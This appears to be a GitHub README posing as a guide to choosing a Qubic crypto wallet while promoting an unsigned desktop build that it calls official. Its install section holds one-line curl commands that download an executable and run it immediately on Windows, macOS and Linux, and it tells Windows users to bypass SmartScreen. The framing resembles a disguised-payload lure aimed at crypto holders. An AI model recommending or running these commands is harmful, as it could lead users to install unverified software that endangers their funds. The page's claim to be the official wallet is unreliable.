![Compare Qubic wallet form factors](assets/banner-trust.png)

# Best Qubic Wallet: How to Choose Between Web, Mobile and Desktop

Three form factors exist, and only one of them is an installed desktop build.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

The form factors below are the ones available at the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2); the desktop build is the one this pack covers.

> The best wallet is the one whose backup you can actually restore.

Choosing a Qubic wallet is not a brand comparison, because there is one official product and it comes in more than one shape. The question is which shape matches how you hold QU: a wallet in a browser, an installed desktop application, or a phone app. Only two of those exist today, and the differences that matter are where the keys live and what you can verify before trusting the thing.

<!-- ARTICLE-BODY-BEGIN -->

## The three form factors

| Form factor | What it is | Where the keys live | What to check first |
| --- | --- | --- | --- |
| Desktop app | Installed build from this repository, Electron shell with a local server | In `qwallet/keys` in your home folder, encrypted with your password | The published SHA-256, because the build is unsigned |
| Web wallet | Runs in a browser tab, nothing to install | In whatever the page stores, which you cannot inspect | When the seed was generated, given the October 2026 incident |
| Mobile | Code exists in the repository, but no mobile build is published | Nothing yet | That a download actually exists before you plan around it |

A hardware device is a fourth shape, and it is not part of this build: no device integration exists in the source, so a Ledger or Tangem holds nothing here. The <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-hardware-ledger-tangem.md">hardware wallet guide</a> covers what that means for custody.

## Choosing by how much you hold

A small balance you move often is a convenience question, and the desktop app wins it by keeping the keys off any server. A balance you touch a few times a year is a custody question: install it, back up the phrase, and keep the machine clean rather than keeping the app open.

A large balance is a discipline question, and no form factor answers it for you. The desktop build stores an encrypted account in a folder you can copy, which means the backup is real only if the password travels separately.

## What the desktop build gives you

It is the only shape where you can read the code, check the hash and keep the account file on a disk you own. The <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-desktop-vs-web-wallet.md">desktop and web comparison</a> sets out the rest of the difference, including the parts where the desktop build is behind.

The build in the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> also shows what it does not do, which is worth knowing before you choose: staking, multi-signature and batch sending are not implemented, so a wallet that advertises them for Qubic is describing something else.

## FAQ

### Is the desktop app the official Qubic wallet?

Yes. This is the official Qubic Wallet, published by the Qubic Wallet organisation from its own account, and it is the build this page refers to.

### Can I use the web wallet and the desktop app with the same account?

Only if you restore the same seed in both. They are separate holders of the same keys, not a synced pair.

### Is the mobile app available?

No build is published, so there is nothing to install. The mobile code in the repository is not a download.

### Which one is safer for a large balance?

The one you can verify and back up. In practice that means the desktop build with a verified installer, a written phrase and an encrypted account file copied to offline media.

### Do I need more than one wallet?

No. One verified install with a good backup beats three installs with none.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Desktop wallet vs web wallet](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-desktop-vs-web-wallet.md)
- [Hardware wallets and this build](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-hardware-ledger-tangem.md)
- [Official download and hash check](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
